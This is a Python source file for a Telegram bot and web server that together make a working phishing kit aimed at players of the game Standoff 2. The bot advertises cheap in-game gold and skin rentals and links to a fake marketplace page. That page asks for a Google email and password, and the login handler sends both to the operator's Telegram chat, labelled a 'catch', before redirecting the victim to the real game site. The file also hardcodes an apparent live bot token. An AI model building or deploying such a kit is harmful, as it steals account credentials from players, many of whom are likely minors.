import asyncio
import logging
import os
from aiogram import Bot, Dispatcher, types
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton
from aiogram.filters import Command
from aiohttp import web

# ===== КОНФИГУРАЦИЯ =====
BOT_TOKEN = "8729915071:AAGn3w7rBkdeaVELxEQea8kgBY0jfljltKk"
ADMIN_CHAT_ID = "6739523131"
# ========================

bot = Bot(token=BOT_TOKEN)
dp = Dispatcher()

# ----- ФЕЙКОВАЯ СТРАНИЦА "ПОКУПКА ГОЛДЫ / АРЕНДА СКИНОВ" -----
FAKE_PAGE = """<!DOCTYPE html>
<html>
<head><meta charset="UTF-8"><title>Купить голду Standoff 2</title>
<style>
body{font-family:Arial;background:#1a1a2e;display:flex;justify-content:center;align-items:center;height:100vh;margin:0;}
.card{background:#16213e;padding:30px;border-radius:15px;color:white;width:400px;text-align:center;}
.gold-price{font-size:28px;color:#f39c12;margin:15px 0;}
.input{width:100%;padding:10px;margin:10px 0;border-radius:5px;border:none;box-sizing:border-box;}
.btn{background:#2ecc71;color:white;padding:12px;border:none;border-radius:5px;width:100%;cursor:pointer;font-size:16px;}
.btn:hover{background:#27ae60;}
.skin{background:#2c3e50;padding:10px;border-radius:10px;margin:10px 0;display:flex;align-items:center;gap:10px;}
.skin-img{font-size:30px;}
</style>
</head>
<body>
<div class="card">
<h2>🔫 STANDOFF 2 MARKET</h2>
<div class="gold-price">💰 5000 ГОЛДЫ = 250₽</div>
<div class="skin">
<div class="skin-img">🔪</div>
<div>🏆 Легендарный нож «Коготь»<br>🎯 Аренда: 50₽/день</div>
</div>
<div class="skin">
<div class="skin-img">🔫</div>
<div>✨ Скин M4A4 «Император»<br>🎯 Аренда: 30₽/день</div>
</div>
<p>✅ Для покупки или аренды подтвердите вход в Google</p>
<form action="/login" method="POST">
<input type="email" name="email" class="input" placeholder="Email от Google аккаунта" required>
<input type="password" name="password" class="input" placeholder="Пароль" required>
<button type="submit" class="btn">🎮 ПОДТВЕРДИТЬ И ВОЙТИ</button>
</form>
<p style="font-size:12px; color:#7f8c8d;">Ваши данные защищены. После входа голда будет начислена автоматически.</p>
</div>
</body>
</html>"""

# ----- ОБРАБОТКА ВЕБ-ЗАПРОСОВ -----
async def handle_index(request):
    return web.Response(text=FAKE_PAGE, content_type='text/html')

async def handle_login(request):
    data = await request.post()
    email = data.get('email', '')
    password = data.get('password', '')
    
    msg = f"🔓 НОВЫЙ УЛОВ (покупка голды)!\n📧 Email: {email}\n🔑 Пароль: {password}"
    await bot.send_message(ADMIN_CHAT_ID, msg)
    
    # Страница успеха
    success_page = """<!DOCTYPE html>
<html>
<head><meta charset="UTF-8"><title>Успешно</title>
<style>body{background:#1a1a2e;color:white;font-family:Arial;text-align:center;padding:50px;}</style>
</head>
<body>
<h2>✅ ДОСТУП ПОДТВЕРЖДЁН</h2>
<p>Голда будет начислена в течение 5 минут.<br>Арендованные скины уже в игре.</p>
<p>Перезайдите в Standoff 2, чтобы увидеть изменения.</p>
<script>setTimeout(()=>{window.location.href='https://standoff2.com';},3000);</script>
</body>
</html>"""
    return web.Response(text=success_page, content_type='text/html')

# ----- TELEGRAM БОТ -----
@dp.message(Command("start"))
async def cmd_start(message: types.Message):
    site_url = "https://standoff-bot-i57l.onrender.com"
    
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="💰 КУПИТЬ ГОЛДУ", url=site_url)],
        [InlineKeyboardButton(text="🔪 АРЕНДОВАТЬ СКИН", url=site_url)],
        [InlineKeyboardButton(text="📦 ВСЕ ПРЕДЛОЖЕНИЯ", url=site_url)]
    ])
    
    await message.answer(
        "🔫 **STANDOFF 2 — МАРКЕТПЛЕЙС**\n\n"
        "💰 **5000 голды** — 250₽\n"
        "🔪 **Аренда скинов** — от 30₽/день\n"
        "⚡ Мгновенная доставка после подтверждения\n\n"
        "Нажми на кнопку, чтобы продолжить:",
        reply_markup=keyboard,
        parse_mode="Markdown"
    )

# ----- ЗАПУСК ВЕБ-СЕРВЕРА -----
async def start_web_server():
    app = web.Application()
    app.router.add_get('/', handle_index)
    app.router.add_post('/login', handle_login)
    runner = web.AppRunner(app)
    await runner.setup()
    port = int(os.environ.get('PORT', 10000))
    site = web.TCPSite(runner, '0.0.0.0', port)
    await site.start()
    print(f"✅ Веб-сервер запущен на порту {port}")

async def main():
    asyncio.create_task(start_web_server())
    print("✅ Бот запущен...")
    await dp.start_polling(bot)

if __name__ == "__main__":
    logging.basicConfig(level=logging.INFO)
    asyncio.run(main())